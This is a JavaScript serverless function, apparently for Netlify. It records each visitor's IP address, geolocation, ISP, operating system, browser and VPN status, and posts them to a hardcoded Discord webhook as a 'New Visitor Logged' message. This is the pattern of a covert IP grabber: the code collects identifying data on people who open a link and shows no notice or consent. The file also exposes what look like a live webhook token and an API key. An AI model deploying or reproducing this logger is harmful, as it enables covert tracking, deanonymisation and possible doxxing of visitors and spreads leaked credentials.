exports.handler = async (event) => {
  const webhookURL = "https://discord.com/api/webhooks/1379270308183277699/_5D3vGdAchQxJAsJXqlKlUPYv8g7Y7WW-9DQHd0Vp5vrcd6y6AZ_1_flpL5ZIuVl6ZTR";
  const proxyCheckKey = "953802-7ll18a-88031m-g5gz09";

  const ip =
    event.headers["x-nf-client-connection-ip"] ||
    event.headers["client-ip"] ||
    event.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    "Unknown IP";

  const userAgent = event.headers["user-agent"] || "Unknown UA";
  const timestamp = new Date().toISOString();

  const detectOS = (ua) => {
    const l = ua.toLowerCase();
    if (l.includes("ipad") || (l.includes("macintosh") && l.includes("mobile"))) return "iPadOS";
    if (l.includes("iphone")) return "iOS";
    if (l.includes("android")) return "Android";
    if (l.includes("windows")) return "Windows";
    if (l.includes("mac os x") || l.includes("macintosh")) return "macOS";
    if (l.includes("linux")) return "Linux";
    return "Unknown";
  };

  const detectBrowser = (ua) => {
    const l = ua.toLowerCase();
    if (l.includes("edg/")) return "Edge";
    if (l.includes("chrome") && !l.includes("edg/") && !l.includes("opr/")) return "Chrome";
    if (l.includes("safari") && !l.includes("chrome")) return "Safari";
    if (l.includes("firefox")) return "Firefox";
    if (l.includes("opr/") || l.includes("opera")) return "Opera";
    if (l.includes("msie") || l.includes("trident")) return "Internet Explorer";
    return "Unknown";
  };

  try {
    // Get location info
    const geoRes = await fetch(`http://ipwho.is/${ip}`);
    const geoData = await geoRes.json();

    const {
      country = "N/A",
      region = "N/A",
      city = "N/A",
      connection: { domain: connectionDomain = "N/A" } = {},
    } = geoData;

    // Get proxy/vpn info
    const proxyRes = await fetch(`https://proxycheck.io/v2/${ip}?key=${proxyCheckKey}&vpn=1&asn=1`);
    const proxyData = await proxyRes.json();
    const vpn = proxyData[ip]?.proxy === "yes";

    const os = detectOS(userAgent);
    const browser = detectBrowser(userAgent);

    const message = {
      content: `New Visitor Logged
**IP**: ${ip}
**Location**: ${city}, ${region}, ${country}
**ISP**: ${connectionDomain}
**OS**: ${os}
**Browser**: ${browser}
**VPN/Proxy**: ${vpn}
**Time**: ${timestamp}`
    };

    await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(message),
    });

    return {
      statusCode: 200,
      body: "Logged successfully",
    };
  } catch (err) {
    console.error("Error:", err);
    return {
      statusCode: 500,
      body: "Failed to send data",
    };
  }
};
